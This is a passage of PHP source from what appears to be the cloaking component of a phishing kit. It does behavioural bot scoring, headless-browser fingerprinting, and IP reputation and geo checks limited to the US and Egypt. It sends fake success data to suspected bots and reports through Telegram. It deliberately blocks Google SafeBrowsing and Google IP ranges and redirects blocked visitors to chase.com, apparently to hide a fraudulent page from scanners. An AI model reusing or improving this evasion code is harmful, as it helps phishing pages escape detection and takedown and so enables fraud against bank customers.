            $reasons[] = 'Suspicious session timing, missing resume logic';
            break;
        }
    }
    
    return ['score' => min($score, 100), 'reasons' => array_unique($reasons)];
}

function calculate_bot_confidence($ip) {
    global $config;
    
    // Run all analysis domains
    $temporal = analyze_temporal_patterns($ip);
    $noise = analyze_interaction_noise($ip);
    $semantics = analyze_ui_semantics($ip);
    $continuity = analyze_session_continuity($ip);
    $mouse = analyze_mouse_movements($ip);
    $idealized = detect_idealized_behavior($ip);
    
    // ============================================
    // DYNAMIC WEIGHTS WITH RANDOMIZATION
    // ============================================
    
    // Base weights for each domain
    $base_weights = [
        'temporal' => 0.20,
        'noise' => 0.15,
        'semantics' => 0.15,
        'continuity' => 0.15,
        'mouse' => 0.20,
        'idealized' => 0.15
    ];
    
    // Apply randomization to prevent reverse engineering
    $randomization_pct = ($config['weight_randomization'] ?? 10) / 100;
    $weights = [];
    
    if ($config['evaluation_order_randomized'] ?? true) {
        foreach ($base_weights as $domain => $weight) {
            // Add random variance +/- randomization_pct
            $variance = (mt_rand() / mt_getrandmax() * 2 - 1) * $randomization_pct;
            $weights[$domain] = $weight * (1 + $variance);
        }
        
        // Normalize weights to sum to 1.0
        $total = array_sum($weights);
        foreach ($weights as $domain => $weight) {
            $weights[$domain] = $weight / $total;
        }
    } else {
        $weights = $base_weights;
    }
    
    // ============================================
    // NON-LINEAR SCORING SYSTEM
    // ============================================
    
    // Non-linear scoring system for threat evaluation
    // High scores are amplified, low scores are dampened
    // This creates more decisive bot/human classification
    $apply_nonlinear = function($score) {
        if ($score < 20) {
            // Very low scores - dampen further (likely human)
            return $score * 0.5;
        } elseif ($score >= 20 && $score < 50) {
            // Medium scores - keep mostly linear
            return $score * 0.9;
        } elseif ($score >= 50 && $score < 70) {
            // High scores - amplify (likely bot)
            return $score * 1.2;
        } else {
            // Very high scores - amplify more (definitely bot)
            return min($score * 1.5, 100);
        }
    };
    
    // Apply non-linear transformation to each domain
    $temporal_adjusted = $apply_nonlinear($temporal['score']);
    $noise_adjusted = $apply_nonlinear($noise['score']);
    $semantics_adjusted = $apply_nonlinear($semantics['score']);
    $continuity_adjusted = $apply_nonlinear($continuity['score']);
    $mouse_adjusted = $apply_nonlinear($mouse['score']);
    $idealized_adjusted = $apply_nonlinear($idealized['score']);
    
    // Weighted average with dynamic weights
    $total_score = (
        $temporal_adjusted * $weights['temporal'] +
        $noise_adjusted * $weights['noise'] +
        $semantics_adjusted * $weights['semantics'] +
        $continuity_adjusted * $weights['continuity'] +
        $mouse_adjusted * $weights['mouse'] +
        $idealized_adjusted * $weights['idealized']
    );
    
    // Apply final non-linear transformation to total
    $final_score = $apply_nonlinear($total_score);
    
    // ============================================
    // DYNAMIC THRESHOLDS WITH RANDOMIZATION
    // ============================================
    
    // Randomize thresholds once at start to prevent reverse engineering
    $human_threshold = mt_rand(
        $config['threshold_human_min'] ?? 15,
        $config['threshold_human_max'] ?? 25
    );
    
    $bot_threshold = mt_rand(
        $config['threshold_bot_min'] ?? 50,
        $config['threshold_bot_max'] ?? 65
    );
    
    // Collect all reasons
    $all_reasons = array_merge(
        $temporal['reasons'],
        $noise['reasons'],
        $semantics['reasons'],
        $continuity['reasons'],
        $mouse['reasons'],
        $idealized['reasons']
    );
    
    // ============================================
    // SILENT SCORING (OBFUSCATED OUTPUT)
    // ============================================
    
    $silent_scoring = $config['silent_scoring_enabled'] ?? true;
    
    return [
        'confidence' => min($final_score, 100),
        'is_confident_human' => $final_score < $human_threshold,
        'is_uncertain' => $final_score >= $human_threshold && $final_score < $bot_threshold,
        'is_likely_bot' => $final_score >= $bot_threshold,
        'reasons' => $all_reasons,
        'domain_scores' => [
            'temporal' => $temporal['score'],
            'noise' => $noise['score'],
            'semantics' => $semantics['score'],
            'continuity' => $continuity['score'],
            'mouse' => $mouse['score'],
            'idealized' => $idealized['score']
        ],
        'adjusted_scores' => $silent_scoring ? 'hidden' : [
            'temporal' => $temporal_adjusted,
            'noise' => $noise_adjusted,
            'semantics' => $semantics_adjusted,
            'continuity' => $continuity_adjusted,
            'mouse' => $mouse_adjusted,
            'idealized' => $idealized_adjusted
        ],
        'weights_used' => $silent_scoring ? 'hidden' : $weights,
        'thresholds_used' => $silent_scoring ? 'hidden' : [
            'human' => $human_threshold,
            'bot' => $bot_threshold
        ]
    ];
}

// ============================================
// SHADOW ENFORCEMENT LAYER
// ============================================

/**
 * Track shadow rate limiting per IP
 */
function check_shadow_rate_limit($ip) {
    global $config;
    static $rate_limits = [];
    
    // Get rate limit settings from config
    $max_requests = $config['shadow_rate_limit'] ?? 10;
    $window_seconds = $config['shadow_rate_window'] ?? 60;
    $block_duration = $config['shadow_block_duration'] ?? 300; // 5 minutes default
    
    if (!isset($rate_limits[$ip])) {
        $rate_limits[$ip] = [
            'requests' => [],
            'blocked_until' => 0
        ];
    }
    
    $now = time();
    
    // Check if currently blocked
    if ($rate_limits[$ip]['blocked_until'] > $now) {
        return false; // Rate limited
    }
    
    // Clean old requests (older than window)
    $rate_limits[$ip]['requests'] = array_filter(
        $rate_limits[$ip]['requests'],
        function($timestamp) use ($now, $window_seconds) { 
            return ($now - $timestamp) < $window_seconds; 
        }
    );
    
    // Add current request
    $rate_limits[$ip]['requests'][] = $now;
    
    // Check if exceeded limit
    if (count($rate_limits[$ip]['requests']) > $max_requests) {
        // Block for configured duration
        $rate_limits[$ip]['blocked_until'] = $now + $block_duration;
        return false;
    }
    
    return true; // Not rate limited
}

/**
 * Apply shadow enforcement to detected bot
 * Returns response that fools the bot into thinking it succeeded
 */
function apply_shadow_enforcement($ip, $bot_score, $config) {
    // Check shadow mode configuration
    $shadow_mode = $config['shadow_mode'] ?? 'shadow';
    
    if ($shadow_mode === 'monitor') {
        // Monitor only - don't enforce
        return null;
    }
    
    if ($shadow_mode === 'block') {
        // Hard block - redirect immediately
        return 'block';
    }
    
    // Shadow mode - apply various tactics
    $tactics = $config['shadow_tactics'] ?? [];
    
    // Silent rate limiting
    if ($tactics['silent_rate_limit'] ?? false) {
        if (!check_shadow_rate_limit($ip)) {
            // Silently slow down the bot with artificial delay (non-blocking)
            // Use usleep instead of sleep to avoid blocking for too long
            $delay_ms = rand(2000, 5000); // 2-5 seconds in milliseconds
            usleep($delay_ms * 1000); // Convert to microseconds
            // Still continue to show fake success
        }
    }
    
    // Apply response delay to waste bot resources
    if (isset($tactics['response_delay_min']) && isset($tactics['response_delay_max'])) {
        $delay_ms = rand($tactics['response_delay_min'], $tactics['response_delay_max']);
        usleep($delay_ms * 1000); // Convert ms to microseconds
    }
    
    // Determine shadow tactic based on bot score
    if ($bot_score >= 80) {
        // Very high confidence bot - apply strongest shadow tactics
        return 'shadow_harsh';
    } elseif ($bot_score >= 60) {
        // Likely bot - apply moderate shadow tactics
        return 'shadow_moderate';
    }
    
    return 'shadow_light';
}

/**
 * Generate fake success response for shadow enforcement
 * Bot thinks it succeeded but actually gets useless data
 */
function generate_fake_success_response($tactic_level) {
    switch ($tactic_level) {
        case 'shadow_harsh':
            // Return completely fake data that looks real
            return [
                'success' => true,
                'message' => 'Request processed successfully',
                'data' => [
                    'id' => 'fake_' . uniqid(),
                    'status' => 'completed',
                    'timestamp' => time(),
                    'items' => [] // Empty results
                ]
            ];
            
        case 'shadow_moderate':
            // Return incomplete/truncated data
            return [
                'success' => true,
                'message' => 'Partial results',
                'data' => [
                    'id' => 'partial_' . uniqid(),
                    'status' => 'processing', // Perpetual processing state
                    'progress' => rand(10, 90) // Random progress
                ]
            ];
            
        case 'shadow_light':
            // Subtle degradation
            return [
                'success' => true,
                'message' => 'Request queued',
                'data' => [
                    'id' => 'queued_' . uniqid(),
                    'status' => 'pending',
                    'estimated_time' => rand(300, 3600) // Random long delay
                ]
            ];
            
        default:
            return ['success' => true];
    }
}

$config = require __DIR__ . '/config.php';

$LOG_FILE                   = $config['log_file'];
$BLACKLIST_THRESHOLD        = $config['blacklist_threshold'];
$PROXYCHECK_RISK_THRESHOLD  = $config['proxycheck_risk_threshold'];
$NEUTRINO_USER_ID           = $config['user_id'];
$NEUTRINO_API_KEY           = $config['api_key'];
$PROXYCHECK_KEY             = $config['proxycheck_key'];
$TG_BOT_TOKEN               = $config['tg_bot_token'];
$TG_CHAT_ID                 = $config['tg_chat_id'];

define('BLOCKED_IPS_FILE', __DIR__ . '/blocked_ips.json');

date_default_timezone_set('Africa/Cairo');

function get_whitelisted_ips() {
    return [
        '127.0.0.1',
        '156.217.174.222',
    ];
}

function load_blocked_ips() {
    if (!file_exists(BLOCKED_IPS_FILE)) {
        file_put_contents(BLOCKED_IPS_FILE, json_encode([], JSON_PRETTY_PRINT));
        @chmod(BLOCKED_IPS_FILE, 0644);
    }
    $content = file_get_contents(BLOCKED_IPS_FILE);
    $array   = json_decode($content, true);
    return is_array($array) ? $array : [];
}

function add_to_blocked_ips($ip) {
    $whitelist = get_whitelisted_ips();
    if (in_array($ip, $whitelist, true)) {
        return;
    }

    $blocked = load_blocked_ips();
    if (!in_array($ip, $blocked, true)) {
        $blocked[] = $ip;
        file_put_contents(BLOCKED_IPS_FILE, json_encode($blocked, JSON_PRETTY_PRINT));
        @chmod(BLOCKED_IPS_FILE, 0644);
    }
}

function send_telegram($text){
    global $TG_BOT_TOKEN, $TG_CHAT_ID;
    if (empty($TG_BOT_TOKEN) || empty($TG_CHAT_ID)) {
        return;
    }
    $url     = "https://api.telegram.org/bot{$TG_BOT_TOKEN}/sendMessage";
    $payload = [
        'chat_id'    => $TG_CHAT_ID,
        'parse_mode' => 'Markdown',
        'text'       => $text,
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT_MS, 500);
    curl_exec($ch);
    curl_close($ch);
}

function is_bot_request($ua){
    if (strlen($ua) < 10) {
        return true;
    }
    return preg_match(
        '/(bot|crawler|spider|crawl|bingbot|googlebot|slurp|baiduspider|yandexbot|duckduckbot|chatgpt|copilot|gptbot|uptimerobot|newrelic|statuscake|pingdom|curl|wget|python|php|httpclient|libwww-perl)/i',
        $ua
    );
}

function check_ip_reputation($ip){
    global $NEUTRINO_USER_ID, $NEUTRINO_API_KEY;
    $url = "https://neutrinoapi.net/host-reputation?" . http_build_query([
        "user-id" => $NEUTRINO_USER_ID,
        "api-key" => $NEUTRINO_API_KEY,
        "host"    => $ip
    ]);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($code !== 200 || !$resp) {
        return ["risk-score" => 0, "lists" => [], "is-proxy" => false, "is-vpn" => false, "is-bot" => false];
    }
    $data = json_decode($resp, true);
    if (!is_array($data)) {
        return ["risk-score" => 0, "lists" => [], "is-proxy" => false, "is-vpn" => false, "is-bot" => false];
    }
    return [
        "risk-score" => intval($data["risk-score"] ?? 0),
        "lists"      => is_array($data["lists"]) ? $data["lists"] : [],
        "is-proxy"   => !empty($data["is-proxy"]),
        "is-vpn"     => !empty($data["is-vpn"]),
        "is-bot"     => !empty($data["is-bot"])
    ];
}

function check_proxycheck($ip){
    global $PROXYCHECK_KEY;
    $url = "https://proxycheck.io/v2/{$ip}?" . http_build_query([
        "key"  => $PROXYCHECK_KEY,
        "vpn"  => 1,
        "risk" => 1
    ]);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $resp = curl_exec($ch);
    curl_close($ch);
    $data = @json_decode($resp, true) ?: [];
    if (!isset($data[$ip])) {
        return ["proxy" => false, "type" => "", "risk" => 0];
    }
    return [
        "proxy" => ($data[$ip]["proxy"] ?? "") === "yes",
        "type"  => $data[$ip]["type"]  ?? "",
        "risk"  => intval($data[$ip]["risk"] ?? 0)
    ];
}

function block_and_exit($client_ip, $user_agent, $reason) {
    global $LOG_FILE;
    add_to_blocked_ips($client_ip);
    $line = date("Y-m-d H:i:s")
          . " | REDIRECTED | IP: {$client_ip}"
          . " | UA: {$user_agent}"
          . " | Reason: {$reason}\n";
    file_put_contents($LOG_FILE, $line, FILE_APPEND);
    if (!headers_sent()) {
        header("Location: https://www.chase.com");
        exit;
    }
}

$client_ip  = get_client_ip();
$user_agent = $_SERVER["HTTP_USER_AGENT"] ?? "";

/**
 * Generate User-Agent hash for tracking and validation
 * Helps detect bot UA rotation patterns
 */
function generate_user_agent_hash($user_agent) {
    return hash('sha256', $user_agent);
}

/**
 * Validate User-Agent hash consistency across sessions
 * Returns true if UA is consistent, false if suspicious change detected
 */
function validate_user_agent_hash($ip, $current_ua) {
    $ua_hash_file = __DIR__ . '/ua_hashes.json';
    
    // Load existing UA hashes
    $ua_hashes = [];
    if (file_exists($ua_hash_file)) {
        $ua_hashes = json_decode(file_get_contents($ua_hash_file), true) ?: [];
    }
    
    $current_hash = generate_user_agent_hash($current_ua);
    
    // Check if IP has previous UA hash
    if (isset($ua_hashes[$ip])) {
        $stored_data = $ua_hashes[$ip];
        $stored_hash = $stored_data['hash'] ?? '';
        $last_seen = $stored_data['timestamp'] ?? 0;
        
        // If UA hash changed within short period (< 1 hour), suspicious
        if ($stored_hash !== $current_hash && (time() - $last_seen) < 3600) {
            // UA rotated too quickly - likely bot
            return false;
        }
    }
    
    // Update or store new hash
    $ua_hashes[$ip] = [
        'hash' => $current_hash,
        'timestamp' => time(),
        'ua' => substr($current_ua, 0, 200) // Store truncated UA for reference
    ];
    
    // Cleanup old entries (older than 7 days)
    $cutoff = time() - (7 * 86400);
    foreach ($ua_hashes as $ip_key => $data) {
        if (($data['timestamp'] ?? 0) < $cutoff) {
            unset($ua_hashes[$ip_key]);
        }
    }
    
    // Save updated hashes
    file_put_contents($ua_hash_file, json_encode($ua_hashes, JSON_PRETTY_PRINT));
    
    return true;
}

// Validate User-Agent hash for this request
$ua_hash_valid = validate_user_agent_hash($client_ip, $user_agent);
if (!$ua_hash_valid) {
    // Suspicious UA rotation detected
    file_put_contents($LOG_FILE ?? __DIR__ . '/logs/antibot.log', 
        date("Y-m-d H:i:s") . " | UA_HASH_ROTATION | IP: {$client_ip} | UA: {$user_agent}\n", 
        FILE_APPEND);
    
    // Force re-verification
    setcookie('fp_hash', '', time() - 3600, '/');
    setcookie('js_verified', '', time() - 3600, '/');
    setcookie('analysis_done', '', time() - 3600, '/');
}

// Session-network binding verification for returning visitors
if (isset($_COOKIE['fp_hash']) && isset($_COOKIE['js_verified'])) {
    // Check if session needs re-evaluation due to aging or behavioral deviation
    if (needs_reevaluation($client_ip, $config)) {
        // Session trust too low or behavioral deviation detected
        force_session_reverification($client_ip);
        
        // Log re-evaluation trigger
        file_put_contents($LOG_FILE ?? __DIR__ . '/logs/antibot.log', 
            date("Y-m-d H:i:s") . " | SESSION_REEVALUATION | IP: {$client_ip} | Reason: Session aging or behavioral deviation\n", 
            FILE_APPEND);
        
        // Continue to verification flow
    } else {
        // Verify session-network binding
        if (!verify_session_binding($client_ip, $_COOKIE['fp_hash'])) {
            // Network changed or session binding failed - require re-verification
            setcookie('fp_hash', '', time() - 3600, '/');
            setcookie('js_verified', '', time() - 3600, '/');
            setcookie('analysis_done', '', time() - 3600, '/');
            
            // Log suspicious activity
            file_put_contents($LOG_FILE ?? __DIR__ . '/logs/antibot.log', 
                date("Y-m-d H:i:s") . " | SESSION_BINDING_FAILED | IP: {$client_ip} | Reason: Network context changed\n", 
                FILE_APPEND);
        }
    }
}

if (is_bot_from_github_list($user_agent)) {
    block_and_exit($client_ip, $user_agent, 'Detected from GitHub Bot List');
}

$referer = $_SERVER['HTTP_REFERER'] ?? '';
$origin  = $_SERVER['HTTP_ORIGIN'] ?? '';
$allowed_sources = [
    'https://gotoschooleg.com',
    'https://www.gotoschooleg.com',
];
foreach ($allowed_sources as $src) {
    if (stripos($referer, $src) !== false || stripos($origin, $src) !== false) {
        return false;
    }
}

if (preg_match('/google.*safebrowsing|googleinspectiontool/i', $user_agent)) {
    block_and_exit($client_ip, $user_agent, 'Blocked Google SafeBrowsing');
}

$google_ranges = ['64.233.', '66.102.', '66.249.', '108.177.', '209.85.', '216.239.'];
foreach ($google_ranges as $prefix) {
    if (str_starts_with($client_ip, $prefix)) {
        block_and_exit($client_ip, $user_agent, 'Blocked Google IP Range');
    }
}
$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$client_ip}?fields=countryCode"), true);
$allowed_countries = ['US', 'EG'];
if (!isset($geo['countryCode']) || !in_array($geo['countryCode'], $allowed_countries)) {
    block_and_exit($client_ip, $user_agent, "Country Not Allowed: " . ($geo['countryCode'] ?? 'Unknown'));
}

$blocked_list = load_blocked_ips();
if (in_array($client_ip, $blocked_list, true)) {
    block_and_exit($client_ip, $user_agent, "Previously Blocked IP");
}

if (!file_exists($LOG_FILE)) {
    file_put_contents($LOG_FILE, "");
    @chmod($LOG_FILE, 0644);
}
file_put_contents($LOG_FILE, date("Y-m-d H:i:s") . " | anitbot.php RUNNING | IP: {$client_ip}\n", FILE_APPEND);

if (empty($user_agent) || preg_match('/^(curl|wget|python|libwww-perl|httpclient|php)/i', $user_agent)) {
    $reason = empty($user_agent) ? "Empty UA" : "Suspicious UA";
    block_and_exit($client_ip, $user_agent, $reason);
}
if (is_bot_request($user_agent)) {
    $reason = "UA Bot";
    block_and_exit($client_ip, $user_agent, $reason);
}

function is_bot_from_github_list(string $ua): bool {
    static $bot_patterns = null;
    if ($bot_patterns === null) {
        $file = __DIR__ . '/crawler-user-agents.json';
        if (!file_exists($file)) return false;
        $json = file_get_contents($file);
        $data = json_decode($json, true);
        if (!is_array($data)) return false;
        $bot_patterns = array_column($data, 'pattern');
    }
    foreach ($bot_patterns as $pattern) {
        if (@preg_match("/$pattern/i", $ua)) {
            return true;
        }
    }
    return false;
}

function is_advanced_bot($ip, $ua) {
    if (isset($_COOKIE['js_verified']) && $_COOKIE['js_verified'] === 'yes') {
        return false;
    }
    
    // 1. Enhanced Playwright/Puppeteer Stealth Detection
    // These bots often use stealth plugins that mask basic detection
    if (preg_match('/HeadlessChrome|Puppeteer|Playwright|PhantomJS/i', $ua)) {
        return 'Headless browser';
    }
    
    // Check for Playwright-specific header patterns
    $playwright_indicators = [
        // Playwright often has specific sec-ch-ua patterns
        'HTTP_SEC_CH_UA' => function($value) {
            return empty($value) || strpos($value, 'Chromium') === false;
        },
        // Missing or inconsistent sec-fetch headers
        'HTTP_SEC_FETCH_MODE' => function($value) {
            return empty($value);
        },
        'HTTP_SEC_FETCH_SITE' => function($value) {
            return empty($value);
        }
    ];
    
    $playwright_score = 0;
    foreach ($playwright_indicators as $header => $check) {
        if (isset($_SERVER[$header])) {
            if ($check($_SERVER[$header])) {
                $playwright_score++;
            }
        } elseif ($header === 'HTTP_SEC_CH_UA' && stripos($ua, 'Chrome') !== false) {
            // Chrome UA but missing sec-ch-ua header
            $playwright_score++;
        }
    }
    
    if ($playwright_score >= 2) {
        return 'Playwright Stealth detected';
    }
    
    // Puppeteer-specific detection patterns
    $puppeteer_indicators = [
        // Puppeteer often has perfect viewport dimensions
        'HTTP_VIEWPORT_WIDTH' => function($value) {
            return !empty($value) && $value === '1920';
        },
        // Check for puppeteer-extra-stealth plugin patterns
        'HTTP_DNT' => function($value) {
            // DNT header often missing or set to specific value
            return $value === '1';
        }
    ];
    
    $puppeteer_score = 0;
    foreach ($puppeteer_indicators as $header => $check) {
        if (isset($_SERVER[$header]) && $check($_SERVER[$header])) {
            $puppeteer_score++;
        }
    }
    
    // Check for inconsistent header combinations that indicate stealth plugins
    if (stripos($ua, 'Chrome') !== false) {
        $has_sec_ch = isset($_SERVER['HTTP_SEC_CH_UA']);
        $has_accept_lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']);
        $has_accept_encoding = isset($_SERVER['HTTP_ACCEPT_ENCODING']);
        
        // Real Chrome always sends all three
        if (!$has_sec_ch || !$has_accept_lang || !$has_accept_encoding) {
            $puppeteer_score++;
        }
        
        // Check for overly simple Accept-Language
        $accept_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
        if ($accept_lang === 'en-US' || $accept_lang === 'en') {
            $puppeteer_score++;
        }
    }
    
    if ($puppeteer_score >= 2) {
        return 'Puppeteer Stealth detected';
    }
    
    // 2. Selenium/WebDriver detection
    if (preg_match('/selenium|webdriver|bot|crawler|spider/i', $ua)) {
        return 'Selenium/WebDriver detected';
    }
    
    // 3. Check for automation headers
    $automation_headers = [
        'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest',
        'HTTP_X_AUTOMATION' => true,
        'HTTP_CHROME_AUTOMATION' => true,
        'HTTP_X_PLAYWRIGHT' => true,
        'HTTP_X_PUPPETEER' => true
    ];
    
    foreach ($automation_headers as $header => $value) {
        if (isset($_SERVER[$header])) {
            if ($value === true || $_SERVER[$header] === $value) {
                return 'Automation headers detected';
            }
        }
    }
    
    // 4. Enhanced Fake Chrome UA detection
    if (stripos($ua, 'Chrome') !== false && (
        empty($_SERVER['HTTP_SEC_CH_UA']) ||
        empty($_SERVER['HTTP_SEC_FETCH_SITE'])
    )) {
        // Additional validation: check if other Chrome-specific headers are missing
        $chrome_headers_present = 0;
        $expected_chrome_headers = [
            'HTTP_SEC_FETCH_MODE',
            'HTTP_SEC_FETCH_DEST',
            'HTTP_SEC_CH_UA_MOBILE',
            'HTTP_SEC_CH_UA_PLATFORM'
        ];
        
        foreach ($expected_chrome_headers as $header) {
            if (isset($_SERVER[$header])) {
                $chrome_headers_present++;
            }
        }
        
        // If less than 2 Chrome headers present, likely fake
        if ($chrome_headers_present < 2) {
            return 'Fake Chrome UA (stealth bot)';
        }
    }
    
    // 5. Missing Accept-Language (common in bots)
    if (empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        return 'Missing Accept-Language header';
    }
    
    // 6. Suspicious Accept-Language values
    $accept_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
    if ($accept_lang === 'en-US' || $accept_lang === 'en') {
        // Too simple - real browsers send more complex Accept-Language
        return 'Suspicious Accept-Language';
    }
    
    // 7. Check for CDP (Chrome DevTools Protocol) indicators in headers
    if (!empty($_SERVER['HTTP_USER_AGENT']) && 
        strpos($_SERVER['HTTP_USER_AGENT'], 'HeadlessChrome') !== false) {
        return 'CDP/HeadlessChrome detected';
    }
    
    // 8. Check for missing or suspicious connection headers
    if (empty($_SERVER['HTTP_CONNECTION'])) {
        return 'Missing Connection header';
    }
    
    // 9. Bot IP ranges (Google, Microsoft, etc.)
    $known_ranges = ['64.233.', '66.102.', '66.249.', '157.55.', '167.89.'];
    foreach ($known_ranges as $prefix) {
        if (str_starts_with($ip, $prefix)) {
            return 'Bot IP Range';
        }
    }
    
    // 10. Check for too-fast requests (< 100ms between requests)
    static $last_request_time = [];
    $current_time = microtime(true);
    if (isset($last_request_time[$ip])) {
        $time_diff = ($current_time - $last_request_time[$ip]) * 1000; // Convert to ms
        if ($time_diff < 100) {
            return 'Too-fast requests (bot-like)';
        }
    }
    $last_request_time[$ip] = $current_time;
    
    return false;
}

$rez        = check_ip_reputation($client_ip);
$risk_score = $rez["risk-score"];
$lists      = $rez["lists"];
$is_proxy   = $rez["is-proxy"];
$is_vpn     = $rez["is-vpn"];
$is_neu_bot = $rez["is-bot"];
$listedCount = 0;
foreach ($lists as $entry) {
    if (!empty($entry["is-listed"])) {
        $listedCount++;
    }
}
$pc              = check_proxycheck($client_ip);
$proxycheckProxy = $pc["proxy"];
$proxycheckType  = $pc["type"];
$proxycheckRisk  = $pc["risk"];

if ($is_proxy || $is_vpn || ($proxycheckProxy && $proxycheckRisk >= $PROXYCHECK_RISK_THRESHOLD)) {
    $reason = "VPN/Proxy Detected";
    block_and_exit($client_ip, $user_agent, $reason);
}
if ($risk_score >= 30 || $listedCount >= $BLACKLIST_THRESHOLD) {
    $reason = "High Risk ({$risk_score}) or ListedCount ({$listedCount})";
    block_and_exit($client_ip, $user_agent, $reason);
}
$log_line = date("Y-m-d H:i:s")
          . " | ALLOWED | IP: {$client_ip}"
          . " | UA: {$user_agent}"
          . " | NeutrinoRisk: {$risk_score}"
          . " | NeutrinoProxy: " . ($is_proxy ? "Y" : "N")
          . " | NeutrinoVPN: "   . ($is_vpn   ? "Y" : "N")
          . " | NeutrinoBot: "   . ($is_neu_bot ? "Y":"N")
          . " | ListedCount: {$listedCount}"
          . " | ProxyCheckProxy: " . ($proxycheckProxy?"Y":"N")
          . " | ProxyCheckType: {$proxycheckType}"
          . " | ProxyCheckRisk: {$proxycheckRisk}"
          . "\n";
file_put_contents($LOG_FILE, $log_line, FILE_APPEND);

// -------------------------------------------------
// CAPTCHA واجهة التحقق Cloudflare-style checkbox كبيرة على الهاتف
// Enhanced with behavioral analysis for better bot detection
// -------------------------------------------------

// Check if this is first visit (no analysis done yet)
$is_first_visit = !isset($_COOKIE['js_verified']) && !isset($_COOKIE['fp_hash']) && !isset($_COOKIE['analysis_done']);

if ($is_first_visit) {
    // First visit: Show analysis page for 5 seconds to collect behavioral data
    setcookie('analysis_done', 'yes', time() + 86400, '/');
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <title>Security Check</title>
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <style>
        body {
          margin: 0;
          padding: 0;
          height: 100vh;
          display: flex;
          justify-content: center;
          align-items: center;
          background: #f8f9fa;
          font-family: "Segoe UI", Tahoma, Arial, sans-serif;
        }
        .analysis-container {
          text-align: center;
          padding: 40px;
        }
        .spinner {
          width: 50px;
          height: 50px;
          margin: 0 auto 20px;
          border: 4px solid #e0e0e0;
          border-top: 4px solid #007bff;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        .message {
          font-size: 18px;
          color: #333;
          margin-bottom: 10px;
        }
        .submessage {
          font-size: 14px;
          color: #666;
        }
      </style>
    </head>
    <body>
      <div class="analysis-container">
        <div class="spinner"></div>
        <div class="message">Checking your connection security...</div>
        <div class="submessage">This will only take a moment</div>
      </div>
      <!-- Include behavioral tracking script -->
      <script src="antibot-tracking.js"></script>
      <script>
        // Store original URL
        try {
          localStorage.setItem("antibot_redirect", <?php echo json_encode($_SERVER['REQUEST_URI']); ?>);
        } catch(e) {}
        
        // Force send behavioral data and wait for completion before reload
        setTimeout(async function() {
          if (window.behaviorTracker && typeof window.behaviorTracker.sendToServer === 'function') {
            // Send data and wait a bit for it to complete
            window.behaviorTracker.sendToServer();
            // Wait 500ms for sendBeacon to complete
            await new Promise(resolve => setTimeout(resolve, 600));
          }
          // After data is sent, navigate to same URL to trigger analysis
          window.location.href = window.location.href;
        }, 4400);
      </script>
    </body>
    </html>
    <?php
    exit;
}

// Calculate bot confidence after initial analysis period (only if analysis_done cookie exists)
if (isset($_COOKIE['analysis_done']) && !isset($_COOKIE['js_verified'], $_COOKIE['fp_hash'])) {
    $bot_analysis = calculate_bot_confidence($client_ip);
    
    // Extract bot characteristics for logging
    $behavior_data = load_behavior_data();
    $ip_data = $behavior_data[$client_ip] ?? [];
    $characteristics = [];
    
    if (isset($ip_data['sessions'])) {
        $sessions = $ip_data['sessions'];
        $characteristics['sessions'] = count($sessions);
        
        // Analyze timing patterns
        $all_actions = [];
        foreach ($sessions as $session) {
            if (isset($session['actions'])) {
                $all_actions = array_merge($all_actions, $session['actions']);
            }
        }
        
        if (count($all_actions) > 1) {
            $intervals = [];
            for ($i = 1; $i < count($all_actions); $i++) {
                $intervals[] = $all_actions[$i]['timestamp'] - $all_actions[$i-1]['timestamp'];
            }
            if (!empty($intervals)) {
                $avg_interval = array_sum($intervals) / count($intervals);
                $characteristics['timing_pattern'] = $avg_interval < 100 ? 
                    "Perfect {$avg_interval}ms intervals (mathematical precision)" : 
                    "Variable timing (human-like)";
            }
        }
        
        // Error rate
        $errors = 0;
        foreach ($sessions as $session) {
            if (isset($session['actions'])) {
                foreach ($session['actions'] as $action) {
                    if ($action['type'] === 'input_correction' || $action['type'] === 'click_cancel') {
                        $errors++;
                    }
                }
            }
        }
        $characteristics['error_rate'] = count($all_actions) > 0 ? round(($errors / count($all_actions)) * 100, 1) : 0;
        $characteristics['error_rate'] .= $errors === 0 ? '% (no human mistakes)' : '% (natural errors)';
        
        // UI interaction
        $decorative_clicks = 0;
        $functional_clicks = 0;
        foreach ($sessions as $session) {
            if (isset($session['actions'])) {
                foreach ($session['actions'] as $action) {
                    if ($action['type'] === 'click') {
                        if (isset($action['target_type']) && $action['target_type'] === 'decorative') {
                            $decorative_clicks++;
                        } else {
                            $functional_clicks++;
                        }
                    }
                }
            }
        }
        $characteristics['ui_interaction'] = $decorative_clicks === 0 && $functional_clicks > 0 ? 
            'Ignores ALL decorative elements' : 
            'Natural interaction with UI';
        
        // Session gaps
        if (count($sessions) > 1) {
            $gaps = [];
            for ($i = 1; $i < count($sessions); $i++) {
                $gap = $sessions[$i]['start_time'] - $sessions[$i-1]['end_time'];
                $gaps[] = $gap;
            }
            $avg_gap = array_sum($gaps) / count($gaps);
            $characteristics['session_gaps'] = $avg_gap < 3 ? 
                "< 3 seconds (inhuman speed)" : 
                ">= 3 seconds (normal)";
        }
    }
    
    // Handle likely bots with shadow enforcement
    if ($bot_analysis['is_likely_bot']) {
        $reason = 'Behavioral Analysis: ' . implode(', ', $bot_analysis['reasons']);
        
        // Log to admin dashboard (hashed for security)
